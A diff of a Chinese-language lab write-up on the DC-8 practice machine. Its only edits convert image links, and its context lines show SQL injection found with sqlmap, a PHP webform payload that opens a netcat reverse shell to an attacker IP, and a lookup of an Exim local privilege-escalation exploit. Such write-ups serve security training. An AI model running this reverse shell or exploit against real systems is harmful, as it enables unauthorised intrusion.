@@ -21,7 +21,7 @@ PORT   STATE SERVICE
 MAC Address: 08:00:27:A3:ED:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 ```
 IP: `192.168.43.88`
-![[Pasted image 20260112153443.png]]
+![](images/Pasted%20image%2020260112153443.png)
 ### dirsearch
 ```bash
 ┌──(root㉿kali)-[~]
@@ -61,12 +61,12 @@ IP: `192.168.43.88`
 
 #### 查看robots.txt
 发现`login`登录的 `path`
-![[Pasted image 20260112210425.png]]
+![](images/Pasted%20image%2020260112210425.png)
 ## 2.页面
 点击`Who we Are` 发现`nid=2`, 推测是否有注入点
-![[Pasted image 20260112160306.png]]
+![](images/Pasted%20image%2020260112160306.png)
 尝试后面加`'`， 发现存在注入点
-![[Pasted image 20260112160356.png]]
+![](images/Pasted%20image%2020260112160356.png)
 ### sqlmap
 
 ```bash
@@ -203,9 +203,9 @@ Session completed.
 ## 3.登录
 
 一点点找有用的线索，这里发现了`webform`可以编辑
-![[Pasted image 20260112165158.png]]
+![](images/Pasted%20image%2020260112165158.png)
 可以选择`php`语言，我们思考可以`nc`反弹
-![[Pasted image 20260112165639.png]]
+![](images/Pasted%20image%2020260112165639.png)
 ```php
 <?php
 system("nc -e /bin/bash 192.168.3.37 1111")
@@ -288,10 +288,10 @@ www-data@dc-8:/var/www/html$
 Exim 4.87 - 4.91 - Local Privilege Escalation  | linux/local/46996.sh
 ......
 ```
-![[Pasted image 20260112202617.png]]
+![](images/Pasted%20image%2020260112202617.png)
 
  **文件路径** : `/usr/share/exploitdb/exploits/linux/local/46996.sh`
-![[Pasted image 20260112204519.png]]
+![](images/Pasted%20image%2020260112204519.png)
 
 #### 发送a.sh
 复制到当前目录，然后改名`a.sh`，方便`http`发送接收
